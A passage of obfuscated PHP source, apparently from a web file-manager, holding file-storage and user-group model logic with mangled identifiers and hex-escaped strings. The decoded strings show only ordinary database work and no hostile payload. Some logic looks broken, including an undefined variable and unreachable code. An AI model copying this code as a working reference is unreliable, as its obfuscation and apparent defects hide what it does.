$this->find($±™ê½ğ²); if (!$Á¬•™€­ || $Á¬•™€­[$ÏöÅéıÒ[560]]) { return; } $Å¢šîêí = IO::hashMd5($ò®¡´¹ú); if (!$Å¢šîêí) { return $ÏöÅéıÒ[12]; } $this->where(array($ÏöÅéıÒ[554] => $±™ê½ğ²))->save(array($ÏöÅéıÒ[560] => $Å¢šîêí)); } public function addFileMake($æè¸…ã, $š·Ãáµß, $Á²ëø°ñ, $’ì“Ï¹’, $ïöÇ¾œ, $£ªõ€Ñ, $÷‘ß¾’) { $°Î¦ó¨Á =& $_SERVER[®»±”ó²]; $ §–ù— = $this->createFileName($£ªõ€Ñ, $š·Ãáµß, $’ì“Ï¹’, $ïöÇ¾œ); $Ã”Ó—‘™ = get_path_father($ §–ù—); $íø˜÷ç  = get_path_this($ §–ù—); if ($÷‘ß¾’) { $¶×è¼Â¹ = IO::move($æè¸…ã, $Ã”Ó—‘™, !1, $íø˜÷ç ); } else { $¶×è¼Â¹ = IO::copy($æè¸…ã, $Ã”Ó—‘™, !1, $íø˜÷ç ); } if (!$¶×è¼Â¹) { return !1; } $î•ßé‘ = IO::init($¶×è¼Â¹); $î•ßé‘->cacheMethod($°Î¦ó¨Á[182], $î•ßé‘->path, $°Î¦ó¨Á[179]); if (IO::size($¶×è¼Â¹) != $Á²ëø°ñ) { return !1; } $š”óø¢± = array($°Î¦ó¨Á[633] => $Á²ëø°ñ, $°Î¦ó¨Á[2052] => 1, $°Î¦ó¨Á[505] => $£ªõ€Ñ, $°Î¦ó¨Á[894] => $š·Ãáµß[$°Î¦ó¨Á[477]], $°Î¦ó¨Á[506] => $ §–ù—, $°Î¦ó¨Á[2053] => $’ì“Ï¹’, $°Î¦ó¨Á[2054] => $ïöÇ¾œ); return $š”óø¢±; } public function addFileCheckExist($î«ìÑ«ô, $µÍƒÖÍ·, $Èãˆš·à) { $İ¡èÎ‚ =& $_SERVER[®»±”ó²]; $®âÄãÒ‚ = $this->findByHash($î«ìÑ«ô, $µÍƒÖÍ·); if (!$®âÄãÒ‚) { return !1; } $ø•¨Ê›¦ = array($İ¡èÎ‚[2052] => intval($®âÄãÒ‚[$İ¡èÎ‚[2059]]) + 1, $İ¡èÎ‚[633] => $Èãˆš·à); $this->where(array($İ¡èÎ‚[555] => $®âÄãÒ‚[$İ¡èÎ‚[554]]))->save($ø•¨Ê›¦); return $®âÄãÒ‚; } public function remove($ùÙÜú¸°) { $this->linkCountChange($ùÙÜú¸°, !1); $this->clearEmpty(); return !0; } public function linkAdd($¨å¹íÌÉ) { $this->linkCountChange($¨å¹íÌÉ, !0); } public function linkCountChange($ÓÓš¬ŞŠ, $ÃùãèÚÍ) { $îÆÒä¤İ =& $_SERVER[®»±”ó²]; if (!$ÓÓš¬ŞŠ) { return; } if (!is_array($ÓÓš¬ŞŠ)) { $ÓÓš¬ŞŠ = array($ÓÓš¬ŞŠ); } $óØÅß™ä = array(); foreach ($ÓÓš¬ŞŠ as $¶Ê±÷ÒÂ) { $†åçŸÅâ = $¶Ê±÷ÒÂ . $îÆÒä¤İ[12]; if (!$óØÅß™ä[$†åçŸÅâ]) { $óØÅß™ä[$†åçŸÅâ] = 0; } $óØÅß™ä[$†åçŸÅâ]++; } $°ÑÇ õó = array(); foreach ($óØÅß™ä as $¶Ê±÷ÒÂ => $…ô±²Ó™) { $†åçŸÅâ = $…ô±²Ó™ . $îÆÒä¤İ[12]; if (!$°ÑÇ õó[$†åçŸÅâ]) { $°ÑÇ õó[$†åçŸÅâ] = array(); } $°ÑÇ õó[$†åçŸÅâ][] = $¶Ê±÷ÒÂ; } foreach ($°ÑÇ õó as $…ô±²Ó™ => $ËóÙœÔ¥) { if (!$ËóÙœÔ¥) { continue; } $…ô±²Ó™ = $ÃùãèÚÍ ? $…ô±²Ó™ : -intval($…ô±²Ó™); $ÀÁ¸šÉ² = array($îÆÒä¤İ[554] => array($îÆÒä¤İ[7], $ËóÙœÔ¥)); if ($…ô±²Ó™ < 0) { $ÀÁ¸šÉ²[$îÆÒä¤İ[2059]] = array($îÆÒä¤İ[1102], abs($…ô±²Ó™)); } $this->where($ÀÁ¸šÉ²)->setAdd($îÆÒä¤İ[2059], $…ô±²Ó™); } } public function findByHash($ûèàµÓ×, $üñËì¿Ã = false) { $åÄ•¨Ê =& $_SERVER[®»±”ó²]; if (!$ûèàµÓ× && !$üñËì¿Ã) { return !1; } $Áò·»ñÏ = array($åÄ•¨Ê[2053] => $ûèàµÓ×); if ($üñËì¿Ã) { $Áò·»ñÏ = array($åÄ•¨Ê[2054] => $üñËì¿Ã); } return $this->order($åÄ•¨Ê[2060])->where($Áò·»ñÏ)->find(); } public function clearEmpty($èõé€ = 1) { $øõ³éÓÕ =& $_SERVER[®»±”ó²]; $äàãŠª = time() - 3600 * 24 * $èõé€; $Ë†±ùÅ« = $øõ³éÓÕ[2061] . $äàãŠª; $ş½¸ïäµ = $this->where($Ë†±ùÅ«)->select(); if (!$ş½¸ïäµ) { return; } $ö†˜œåê = new Task($øõ³éÓÕ[2062], $øõ³éÓÕ[12], count($ş½¸ïäµ)); foreach ($ş½¸ïäµ as $Ïà’ñÔŠ) { $ö†˜œåê->update(1); $this->resetFile($Ïà’ñÔŠ); } $ö†˜œåê->end(); } public function resetFile($Óü¨×èå) { $ùÆîÈ =& $_SERVER[®»±”ó²]; $î’’ÏËÃ = array($ùÆîÈ[555] => $Óü¨×èå[$ùÆîÈ[554]]); $Ó—äïäø = Model($ùÆîÈ[1440])->where($î’’ÏËÃ)->count(); $¶Ç§¤‚ = Model($ùÆîÈ[2063])->where($î’’ÏËÃ)->count(); $å¼ÈÓ = intval($Ó—äïäø) + intval($¶Ç§¤‚); if ($å¼ÈÓ == 0) { IO::remove($Óü¨×èå[$ùÆîÈ[87]]); Model($ùÆîÈ[2064])->delete($Óü¨×èå[$ùÆîÈ[554]]); $this->where($î’’ÏËÃ)->delete(); $this->metaSet($Óü¨×èå[$ùÆîÈ[554]], null, null); write_log(ACTION . $ùÆîÈ[2065] . KodUser::id() . $ùÆîÈ[2066] . $Óü¨×èå[$ùÆîÈ[554]] . $ùÆîÈ[2067] . $Óü¨×èå[$ùÆîÈ[79]] . $ùÆîÈ[202] . $Óü¨×èå[$ùÆîÈ[87]], $ùÆîÈ[2068]); return; } if ($Óü¨×èå[$ùÆîÈ[2059]] != $å¼ÈÓ) { $this->where($î’’ÏËÃ)->save(array($ùÆîÈ[2052] => $å¼ÈÓ)); } } public function storageInfo($Íº‚·Ê = false) { $¡Ø®ıñé =& $_SERVER[®»±”ó²]; $’”ù€¸ = $this->count() + 0.0; $Ñ§º¢î = 0; $ØÏÌğËÍ = 1; $ÕŸñèËç = 0; $•è°Ğµ = 5000; for ($Ê®ù¥†” = 0; $Ê®ù¥†” < $’”ù€¸; $Ê®ù¥†” = $Ê®ù¥†” + $•è°Ğµ) { $¨ø»È›­ = $this->limit($Ê®ù¥†”, $Ê®ù¥†” + $•è°Ğµ)->select(); foreach ($¨ø»È›­ as $„Ó‡ÆÃİ) { $ØÏÌğËÍ += $„Ó‡ÆÃİ[$¡Ø®ıñé[79]] * $„Ó‡ÆÃİ[$¡Ø®ıñé[2059]]; $Ñ§º¢î += $„Ó‡ÆÃİ[$¡Ø®ıñé[79]] * ($„Ó‡ÆÃİ[$¡Ø®ıñé[2059]] - 1); $ÕŸñèËç += $„Ó‡ÆÃİ[$¡Ø®ıñé[2059]]; } } $ÅœïÜ€ = array($¡Ø®ıñé[2069] => $ØÏÌğËÍ, $¡Ø®ıñé[2070] => $Ñ§º¢î, $¡Ø®ıñé[2071] => $Ñ§º¢î / $ØÏÌğËÍ, $¡Ø®ıñé[83] => $’”ù€¸, $¡Ø®ıñé[2072] => $ÕŸñèËç); return $ÅœïÜ€; } } class GroupModel extends ModelBase { protected $tableName = "\x67\x72\x6f\165\160"; protected $tableMeta = array("\164\x61\x62\154\145\x4e\x61\x6d\145" => "\147\162\157\x75\160\x5f\155\145\164\x61", "\155\x65\x74\141\x46\x69\145\154\144" => "\147\x72\x6f\x75\x70\x49\104"); protected function cacheFunctionAlias($¯øœò‘ ) { $¢æïâá† =& $_SERVER[®»±”ó²]; return array($¢æïâá†[2073] => array($¯øœò‘ [0], $¢æïâá†[2074]), $¢æïâá†[2075] => array($¯øœò‘ [0], $¢æïâá†[2076])); } protected function getInfo($¶öÔÔ°ü, $Ÿñ—İ¨ˆ = false) { $‹Û½ïïæ = $this->getInfoSimple($¶öÔÔ°ü); if (!$‹Û½ïïæ) { return !1; } if ($Ÿñ—İ¨ˆ) { return $this->_listDataApplyItem($‹Û½ïïæ); } return $this->cacheFunctionGet($_SERVER[®»±”ó²][2077], $¶öÔÔ°ü); } protected function getInfoSimple($¿¶Îã™Æ, $³¼åß†ø = false) { $Ò¢Â£î« =& $_SERVER[®»±”ó²]; if ($³¼åß†ø) { $Õïíºş¯ = array($Ò¢Â£î«[1402] => intval($¿¶Îã™Æ)); $ñè’¨š¿ = $this->where($Õïíºş¯)->find(); return is_array($ñè’¨š¿) ? $ñè’¨š¿ : array(); } return $this->cacheFunctionGet($Ò¢Â£î«[2078], $¿¶Îã™Æ); } protected function groupAdd($ÁËÍš„­) { $éêÓÏùü =& $_SERVER[®»±”ó²]; if (!$ÁËÍš„­[$éêÓÏùü[193]] && isset($ÁËÍš„­[$éêÓÏùü[1402]]) && $ÁËÍš„­[$éêÓÏùü[1402]] == 1) { if ($ÚêàğÉ = $this->getInfoSimple($ÁËÍš„­[$éêÓÏùü[1402]], !0)) { return $ÁËÍš„­[$éêÓÏùü[1402]]; } } else { $ÚêàğÉ = $this->getInfoSimple($ÁËÍš„­[$éêÓÏùü[193]]); if (!$ÚêàğÉ) { return !1; } } $Ò„Ôöûë = $éêÓÏùü[606]; if ($ÚêàğÉ[$éêÓÏùü[597]]) { $Ò„Ôöûë = $ÚêàğÉ[$éêÓÏùü[597]] . $ÚêàğÉ[$éêÓÏùü[1402]] . $éêÓÏùü[50]; } $’òëçºæ = array($éêÓÏùü[505] => $this->groupNameAuto($ÁËÍš„­[$éêÓÏùü[193]], $ÁËÍš„­[$éêÓÏùü[32]]), $éêÓÏùü[488] => $ÁËÍš„­[$éêÓÏùü[193]], $éêÓÏùü[668] => $Ò„Ôöûë, $éêÓÏùü[2079] => $ÁËÍš„­[$éêÓÏùü[1978]], $éêÓÏùü[2080] => 0, $éêÓÏùü[1995] => 0); $ÁËÍš„­[$éêÓÏùü[32]] = $’òëçºæ[$éêÓÏùü[32]]; if (isset($ÁËÍš„­[$éêÓÏùü[2015]])) { $’òëçºæ[$éêÓÏùü[2015]] = $ÁËÍš„­[$éêÓÏùü[2015]]; } else { $È·§£ = $this->max($éêÓÏùü[2015]); if (!$È·§£) { $È·§£ = 0; } $’òëçºæ[$éêÓÏùü[2015]] = $È·§£ + 1; } if (!empty($ÁËÍš„­[$éêÓÏùü[1402]])) { $’òëçºæ[$éêÓÏùü[1402]] = $ÁËÍš„­[$éêÓÏùü[1402]]; } $öú¼¤… = $this->add($’òëçºæ); $this->groupMetaEdit($öú¼¤…, $ÁËÍš„­); Model($éêÓÏùü[1440])->groupRootAdd($öú¼¤…); $this->_clearCache($ÁËÍš„­[$éêÓÏùü[193]]); return $öú¼¤…; } protected function groupEdit($º²ö­²´, $Ä«»™Õâ) { $½‡Ü·çı =& $_SERVER[®»±”ó²]; $½úãğ¾Á = $this->getInfoSimple($º²ö­²´); if (!$½úãğ¾Á) { return !1; } if (!empty($Ä«»™Õâ[$½‡Ü·çı[193]])) { $ßÔÎ˜ = $this->getInfoSimple($Ä«»™Õâ[$½‡Ü·çı[193]]); if (!$ßÔÎ˜) { return !1; } if ($½úãğ¾Á[$½‡Ü·çı[1402]] == $ßÔÎ˜[$½‡Ü·çı[1402]]) { return !1; } if ($Ä«»™Õâ[$½‡Ü·çı[193]] != $½úãğ¾Á[$½‡Ü·çı[193]]) { if ($ßÔÎ˜[$½‡Ü·çı[597]] !== $½úãğ¾Á[$½‡Ü·çı[597]] && strpos($ßÔÎ˜[$½‡Ü·çı[597]], $½úãğ¾Á[$½‡Ü·çı[597]] . $½úãğ¾Á[$½‡Ü·çı[1402]] . $½‡Ü·çı[50]) === 0) { return !1; } $Ä«»™Õâ[$½‡Ü·çı[668]] = $ßÔÎ˜[$½‡Ü·çı[597]] . $Ä«»™Õâ[$½‡Ü·çı[193]] . $½‡Ü·çı[50]; $this->_changeChildLevel($½úãğ¾Á, $ßÔÎ˜); $this->_clearCache($ßÔÎ˜[$½‡Ü·çı[1402]]); $this->_clearCache($½úãğ¾Á[$½‡Ü·çı[193]]); } } $this->groupMetaEdit($º²ö­²´, $Ä«»™Õâ); $this->_clearChildrenCache($½úãğ¾Á); return $this->where(array($½‡Ü·çı[2081] => $º²ö­²´))->save($Ä«»™Õâ); } private function groupMetaEdit($¹ğ òÚ, &$¶ü¹Ñœ­) { $“ÃüóåÏ =& $_SERVER[®»±”ó²]; if (isset($¶ü¹Ñœ­[$“ÃüóåÏ[32]])) { $this->setNamePinyin($¹ğ òÚ, $¶ü¹Ñœ­[$“ÃüóåÏ[32]]); } if (isset($¶ü¹Ñœ­[$“ÃüóåÏ[2082]])) { $Å–ÙáåŒ = array($“ÃüóåÏ[2082] => $¶ü¹Ñœ­[$“ÃüóåÏ[2082]], $“ÃüóåÏ[2083] => $¶ü¹Ñœ­[$“ÃüóåÏ[2083]]); unset($¶ü¹Ñœ­[$“ÃüóåÏ[2082]]); unset($¶ü¹Ñœ­[$“ÃüóåÏ[2083]]); if (isset($¶ü¹Ñœ­[$“ÃüóåÏ[2084]])) { $íõı¾´¬ = $“ÃüóåÏ[1398] . $¹ğ òÚ; $—­÷À™° = $“ÃüóåÏ[1397]; $èøŒ¥’ = $¶ü¹Ñœ­[$“ÃüóåÏ[2084]] ? $¶ü¹Ñœ­[$“ÃüóåÏ[2084]] : $“ÃüóåÏ[12]; $†…í‡ùÇ = Model($“ÃüóåÏ[1396])->get($íõı¾´¬, $—­÷À™°); $†…í‡ùÇ = $†…í‡ùÇ ? $†…í‡ùÇ : $“ÃüóåÏ[12]; if ($†…í‡ùÇ != $èøŒ¥’) { if (!$èøŒ¥’ && $†…í‡ùÇ) { Model($“ÃüóåÏ[1396])->remove($íõı¾´¬, $—­÷À™°); } else { if ($èøŒ¥’) { Model($“ÃüóåÏ[1396])->set($íõı¾´¬, $èøŒ¥’, $—­÷À™°); } } } $Å–ÙáåŒ[$“ÃüóåÏ[2084]] = $èøŒ¥’; } $this->metaSet($¹ğ òÚ, $Å–ÙáåŒ); } } private function _clearChildrenCache($şÏßâé) { $æ˜€ÖËŸ =& $_SERVER[®»±”ó²]; $¢úàª›§ = array($æ˜€ÖËŸ[668] => array($æ˜€ÖËŸ[628], $şÏßâé[$æ˜€ÖËŸ[597]] . $şÏßâé[$æ˜€ÖËŸ[1402]] . $æ˜€ÖËŸ[629])); $ƒŒºÀàÑ = $this->field($æ˜€ÖËŸ[1402])->where($¢úàª›§)->select(); foreach ($ƒŒºÀàÑ as $ÄÑåƒ²) { $this->_clearCache($ÄÑåƒ²[$æ˜€ÖËŸ[1402]]); } } private function _clearCache($”İê‡Ö) { $öĞ‘£šö =& $_SERVER[®»±”ó²]; $this->cacheFunctionClear($öĞ‘£šö[2077], $”İê‡Ö); $this->cacheFunctionClear($öĞ‘£šö[2078], $”İê‡Ö); } private function _changeChildLevel($Øú¢²‚Ğ, $§©ƒ¯Öó, $Ìü”Ê» = false) { $ı¦­ÙƒÏ =& $_SERVER[®»±”ó²]; $‰ÕÒºÖ = $Øú¢²‚Ğ[$ı¦­ÙƒÏ[597]] . $Øú¢²‚Ğ[$ı¦­ÙƒÏ[1402]] . $ı¦­ÙƒÏ[50]; $ÑñÎ­ÆŒ = $§©ƒ¯Öó[$ı¦­ÙƒÏ[597]] . $§©ƒ¯Öó[$ı¦­ÙƒÏ[1402]] . $ı¦­ÙƒÏ[50] . $Øú¢²‚Ğ[$ı¦­ÙƒÏ[1402]] . $ı¦­ÙƒÏ[50]; if ($Ìü”Ê») { $ÑñÎ­ÆŒ = $§©ƒ¯Öó[$ı¦­ÙƒÏ[597]] . $§©ƒ¯Öó[$ı¦­ÙƒÏ[1402]] . $ı¦­ÙƒÏ[50]; } $‚—º¨éÅ = array($ı¦­ÙƒÏ[668] => array($ı¦­ÙƒÏ[628], $Øú¢²‚Ğ[$ı¦­ÙƒÏ[597]] . $Øú¢²‚Ğ[$ı¦­ÙƒÏ[1402]] . $ı¦­ÙƒÏ[629])); $²¤¾¿ØÑ = array($ı¦­ÙƒÏ[668] => array($ı¦­ÙƒÏ[677], "\x72\x65\x70\x6c\x61\143\145\x28\160\x61\162\145\x6e\164\114\145\166\x65\x6c\54\x27{$‰ÕÒºÖ}\x27\x2c\47{$ÑñÎ­ÆŒ}\x27\51")); $this->_clearChildrenCache($Øú¢²‚Ğ); $this->where($‚—º¨éÅ)->data($²¤¾¿ØÑ)->save(); } public function setNamePinyin($Ìíùû²©, $ğÖ ñßœ = false) { $·æ¤ƒÏ¡ =& $_SERVER[®»±”ó²]; if (!$ğÖ ñßœ) { $ïéîúØÆ = $this->getInfoSimple($Ìíùû²©); $ğÖ ñßœ = $ïéîúØÆ[$·æ¤ƒÏ¡[32]]; } if (!Input::check($ğÖ ñßœ, $·æ¤ƒÏ¡[671])) { $this->metaSet($Ìíùû²©, $·æ¤ƒÏ¡[549], null); $this->metaSet($Ìíùû²©, $·æ¤ƒÏ¡[548], null); return; } $¢˜ŸÄ€ = array($·æ¤ƒÏ¡[549] => str_replace($·æ¤ƒÏ¡[53], $·æ¤ƒÏ¡[12], Pinyin::get($ğÖ ñßœ)), $·æ¤ƒÏ¡[548] => Pinyin::get($ğÖ ñßœ, $·æ¤ƒÏ¡[672])); $this->metaSet($Ìíùû²©, $¢˜ŸÄ€); } protected function metaSet($Ãšø•Ë, $¸¡’Ú£Ñ = null, $¢ÛûºĞÎ = null) { $this->_clearCache($Ãšø•Ë); return parent::metaSet($Ãšø•Ë, $¸¡’Ú£Ñ, $¢ÛûºĞÎ); } protected function groupStatus($¨áİ±Ç, $±ì Ú»ì) { $ü¼¼°ß¼ =& $_SERVER[®»±”ó²]; $°î¤»âĞ = $this->getInfoSimple($¨áİ±Ç); if (!$°î¤»âĞ) { return !1; } $this->_clearCache($¨áİ±Ç); return $this->metaSet($¨áİ±Ç, $ü¼¼°ß¼[830], $±ì Ú»ì); if ($±ì Ú»ì == $ü¼¼°ß¼[91]) { $¬ˆÊÌåœ = $this->parentLevelArray($°î¤»âĞ[$ü¼¼°ß¼[597]]); } else { } $¬ˆÊÌåœ[] = $°î¤»âĞ[$ü¼¼°ß¼[1402]]; $ËªÜÛ‰£ = array(); foreach ($¬ˆÊÌåœ as $¨áİ±Ç) { $ËªÜÛ‰£[] = array($ü¼¼°ß¼[1402] => $¨áİ±Ç, $ü¼¼°ß¼[97] => $ü¼¼°ß¼[830], $ü¼¼°ß¼[452] => $±ì Ú»ì); $this->_clearCache($¨áİ±Ç); } return Model($ü¼¼°ß¼[2085])->addAll($ËªÜÛ‰£, array(), !0); } protected function groupRemove($‘¿±Ñòì, $Ğú¶²«Œ = false) { $·Á»ËñØ =& $_SERVER[®»±”ó²]; $‘ Ò±Ö¡ = array($·Á»ËñØ[1402] => $‘¿±Ñòì); $¹§êšÍÃ = $this->where($‘ Ò±Ö¡)->find(); if (!$¹§êšÍÃ || $¹§êšÍÃ[$·Á»ËñØ[193]] == 0) { return !1; } if (!$Ğú¶²«Œ) { $¼¹ë¤† = $this->getInfoSimple($¹§êšÍÃ[$·Á»ËñØ[193]]); $this->_changeChildLevel($¹§êšÍÃ, $¼¹ë¤†, !0); $this->where(array($·Á»ËñØ[193] => $‘¿±Ñòì))->save(array($·Á»ËñØ[193] => $¹§êšÍÃ[$·Á»ËñØ[193]])); $this->_clearCache($¼¹ë¤†[$·Á»ËñØ[1402]]); } Model($·Á»ËñØ[2085])->where($‘ Ò±Ö¡)->delete(); Model($·Á»ËñØ[2086])->where($‘ Ò±Ö¡)->delete(); Model($·Á»ËñØ[911])->groupRootRemove($‘¿±Ñòì); $this->_clearCache($¹§êšÍÃ[$·Á»ËñØ[193]]); return $this->where($‘ Ò±Ö¡)->delete(); } protected function groupSort($®èÜñ®á) { $ô§ÇÈÉÀ =& $_SERVER[®»±”ó²]; $ÍÌÍŠ¤º = array(); foreach ($®èÜñ®á as $™â—’“Ú => $ì½Ìß„İ) { $ÍÌÍŠ¤º[] = array($ô§ÇÈÉÀ[1402], $ì½Ìß„İ, $ô§ÇÈÉÀ[2015], $™â—’“Ú + 1); } $this->saveAll($ÍÌÍŠ¤º); } public function listData() { $úüÂîŒ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($úüÂîŒ[$_SERVER[®»±”ó²][447]]); return $úüÂîŒ; } private function _makeOrder($ûøë¡•Â = '') { $Ï±¤¤õå =& $_SERVER[®»±”ó²]; $É¤×Ã·î = array($Ï±¤¤õå[1402], $Ï±¤¤õå[32], $Ï±¤¤õå[1980], $Ï±¤¤õå[234]); $¬Û©û¸ß = array($Ï±¤¤õå[534] => $Ï±¤¤õå[535], $Ï±¤¤õå[536] => $Ï±¤¤õå[537]); $ Â“„‹¶ = Input::get($Ï±¤¤õå[541], $Ï±¤¤õå[7], $Ï±¤¤õå[1995], $É¤×Ã·î); $á¨Éô©ù = Input::get($Ï±¤¤õå[542], $Ï±¤¤õå[7], $Ï±¤¤õå[2087], array($Ï±¤¤õå[2087], $Ï±¤¤õå[536])); $á¨Éô©ù = $¬Û©û¸ß[$á¨Éô©ù]; $ûøë¡•Â = $ûøë¡•Â . "{$ Â“„‹¶}\x20{$á¨Éô©ù}\x2c\40\x67\162\x6f\x75\x70\111\104\x20\x61\x73\143"; return $this->order($ûøë¡•Â); } public function listChild($ ’íÏ) { $â‹¬ïŠ¬ =& $_SERVER[®»±”ó²]; $§üÔ†¶¶ = $this->where(array($â‹¬ïŠ¬[193] => $ ’íÏ))->_makeOrder()->selectPage(200); $this->_listDataApply($§üÔ†¶¶[$â‹¬ïŠ¬[447]]); return $§üÔ†¶¶; } public function listChildIds($¹†¢¿Èû) { $Ü„èŞĞ =& $_SERVER[®»±”ó²]; if (is_string($ôÚ’èŞí)) { $¹†¢¿Èû = explode($Ü„èŞĞ[50], $¹†¢¿Èû); } $ş¼¼ŞÜ = $this->where(array($Ü„èŞĞ[1402] => array($Ü„èŞĞ[7], $¹†¢¿Èû)))->field($Ü„èŞĞ[2088])->select(); if (!$ş¼¼ŞÜ) { return !1; } $Ã×üª–İ = array(); foreach ($ş¼¼ŞÜ as $Œª—®ëì) { $Ã×üª–İ[] = "\x73\x65\154\x65\x63\164\x20\147\x72\x6f\165\160\111\104\x20\146\x72\x6f\x6d\x20\x60\147\162\157\x75\x70\x60\40\167\150\145\x72\145\40\160\141\162\145\156\x74\x4c\x65\166\x65\x6c\40\x6c\x69\x6b\145\40\47{$Œª—®ëì[$Ü„èŞĞ[597]]}{$Œª—®ëì[$Ü„èŞĞ[1402]]}\54\45\x27"; } $Ã×üª–İ = implode($Ü„èŞĞ[2089], $Ã×üª–İ); $ş¼¼ŞÜ = $this->query($Ã×üª–İ); if (!$ş¼¼ŞÜ) { return array(); } $¹†¢¿Èû = array_to_keyvalue($ş¼¼ŞÜ, $Ü„èŞĞ[12], $Ü„èŞĞ[1402]); return array_unique($¹†¢¿Èû); } public function listByID($ƒÌÊÖœç) { $ú§¬ğÎ¨ =& $_SERVER[®»±”ó²]; if (!$ƒÌÊÖœç) { return array(); } $°ùŠÁ‹ø = array($ú§¬ğÎ¨[1402] => array($ú§¬ğÎ¨[7], $ƒÌÊÖœç)); $Ì½ú€ƒ = $this->where($°ùŠÁ‹ø)->select(); $Ì½ú€ƒ = array_sort_keep($Ì½ú€ƒ, $ú§¬ğÎ¨[1402], $ƒÌÊÖœç); $this->_listDataApply($Ì½ú€ƒ); return $Ì½ú€ƒ; } public function listSearch($ğæ¹ç•ü) { $şİÊ‘¤’ =& $_SERVER[®»±”ó²]; $ Ğàî“ = trim($ğæ¹ç•ü[$şİÊ‘¤’[2090]]); $å•™µğç = explode($şİÊ‘¤’[53], $ Ğàî“); if (!$ Ğàî“ || count($å•™µğç) == 1) { return $this->listSearchNow($ğæ¹ç•ü); } $Ùå²¹˜  = array($şİÊ‘¤’[447] => array()); foreach ($å•™µğç as $ÑÉñ‚—…) { if (!trim($ÑÉñ‚—…)) { continue; } $ğæ¹ç•ü[$şİÊ‘¤’[2090]] = $ÑÉñ‚—…; $ô¡„·÷Š = $this->listSearchNow($ğæ¹ç•ü); $Ùå²¹˜ [$şİÊ‘¤’[447]] = array_merge($Ùå²¹˜ [$şİÊ‘¤’[447]], $ô¡„·÷Š[$şİÊ‘¤’[447]]); } $Ùå²¹˜ [$şİÊ‘¤’[447]] = array_unique_by_key($Ùå²¹˜ [$şİÊ‘¤’[447]], $şİÊ‘¤’[1402]); $Ùå²¹˜ [$şİÊ‘¤’[444]] = array($şİÊ‘¤’[445] => count($Ùå²¹˜ [$şİÊ‘¤’[447]]), $şİÊ‘¤’[441] => 20, $şİÊ‘¤’[430] => 1, $şİÊ‘¤’[446] => 1); return $Ùå²¹˜ ; } public function listSearchNow($ÙÎûçĞÈ) { $¡ÜÓ™Ä =& $_SERVER[®»±”ó²]; $Äìè¼ƒã = trim($ÙÎûçĞÈ[$¡ÜÓ™Ä[2090]]); $Øšæ×­‚ = isset($ÙÎûçĞÈ[$¡ÜÓ™Ä[2091]]) ? $ÙÎûçĞÈ[$¡ÜÓ™Ä[2091]] : !1; if (!trim($Äìè¼ƒã)) { return !1; } $Äìè¼ƒã = str_replace($¡ÜÓ™Ä[2092], $¡ÜÓ™Ä[2093], $Äìè¼ƒã); $ŠŠÌŠƒ = array($¡ÜÓ™Ä[1402] => array($¡ÜÓ™Ä[461], "{$Äìè¼ƒã}\45"), $¡ÜÓ™Ä[32] => array($¡ÜÓ™Ä[461], "\45{$Äìè¼ƒã}\45"), $¡ÜÓ™Ä[1087] => $¡ÜÓ™Ä[2094]); if ($Øšæ×­‚) { $ˆÍÈÔäÌ = $this->getInfoSimple($Øšæ×­‚); $ó‰‚šë¿ = $ˆÍÈÔäÌ[$¡ÜÓ™Ä[597]] . $Øšæ×­‚ . $¡ÜÓ™Ä[629]; $ŠŠÌŠƒ = array($ŠŠÌŠƒ, array($¡ÜÓ™Ä[597] => array($¡ÜÓ™Ä[461], $ó‰‚šë¿))); } $ŠŠÌŠƒ = $this->parseWhereLike($ŠŠÌŠƒ); $ÊÁåÅ¹ = $this->_makeOrder()->where($ŠŠÌŠƒ)->selectPage(20); $ÊÁåÅ¹ = $ÊÁåÅ¹ ? $ÊÁåÅ¹ : array($¡ÜÓ™Ä[447] => array(), $¡ÜÓ™Ä[444] => array()); if (!$ÊÁåÅ¹ || count($ÊÁåÅ¹[$¡ÜÓ™Ä[447]]) < 5 && Input::check($Äìè¼ƒã, $¡ÜÓ™Ä[395])) { $åÇŸä» = $this->groupChildrenAll($Øšæ×­‚); $¦Âµª£ó = $this->_searchFromMeta($¡ÜÓ™Ä[548], $Äìè¼ƒã, 10, $åÇŸä»); $Õ§ÁìŸÆ = $this->_searchFromMeta($¡ÜÓ™Ä[549], $Äìè¼ƒã, 10, $åÇŸä»); $¥ÖÄß–© = array_merge($¦Âµª£ó, $Õ§ÁìŸÆ, $ÊÁåÅ¹[$¡ÜÓ™Ä[447]]); $ÊÁåÅ¹[$¡ÜÓ™Ä[447]] = array_unique_by_key($¥ÖÄß–©, $¡ÜÓ™Ä[1402]); $ÊÁåÅ¹[$¡ÜÓ™Ä[444]][$¡ÜÓ™Ä[445]] = count($ÊÁåÅ¹[$¡ÜÓ™Ä[447]]); $ÊÁåÅ¹[$¡ÜÓ™Ä[444]][$¡ÜÓ™Ä[446]] = ceil($ÊÁåÅ¹[$¡ÜÓ™Ä[444]][$¡ÜÓ™Ä[445]] / $ÊÁåÅ¹[$¡ÜÓ™Ä[444]][$¡ÜÓ™Ä[441]]); } $this->_listDataApply($ÊÁåÅ¹[$¡ÜÓ™Ä[447]]); return $ÊÁåÅ¹; } protected function groupChildrenAll($ı—Ò®óî) { $©èÆÇÒ¡ =& $_SERVER[®»±”ó²]; if (!$ı—Ò®óî) { return !1; } if (!is_array($ı—Ò®óî)) { $ı—Ò®óî = array($ı—Ò®óî); } $õ’šÓ© = $ı—Ò®óî; foreach ($ı—Ò®óî as $ëĞ‚Ó³Ø) { $²ü³àâª = $this->getInfoSimple($ëĞ‚Ó³Ø); $ÎĞÕíŞÈ = array($©èÆÇÒ¡[597] => array($©èÆÇÒ¡[461], $²ü³àâª[$©èÆÇÒ¡[597]] . $ëĞ‚Ó³Ø . $©èÆÇÒ¡[629])); $Şë¦ˆˆµ = $this->field($©èÆÇÒ¡[1402])->where($ÎĞÕíŞÈ)->select(); $õ’šÓ© = array_merge($õ’šÓ©, array_to_keyvalue($Şë¦ˆˆµ, $©èÆÇÒ¡[12], $©èÆÇÒ¡[1402])); } return array_unique($õ’šÓ©); } private function _searchFromMeta($ééÙ¹ŞÈ, $Œˆ·¢ ¡, $œ×¾‹¨¬, $ñü²«ûÕ) { $Õ—°şà¨ =& $_SERVER[®»±”ó²]; $Œˆ·¢ ¡ = strtolower($Œˆ·¢ ¡); $É«œò = array($Õ—°şà¨[97] => $ééÙ¹ŞÈ, $Õ—°şà¨[452] => array($Õ—°şà¨[461], "\45{$Œˆ·¢ ¡}\45")); $É«œò = $this->parseWhereLike($É«œò); if ($ñü²«ûÕ) { $É«œò[$Õ—°şà¨[1402]] = array($Õ—°şà¨[7], $ñü²«ûÕ); } $ÙË¼í¨¨ = 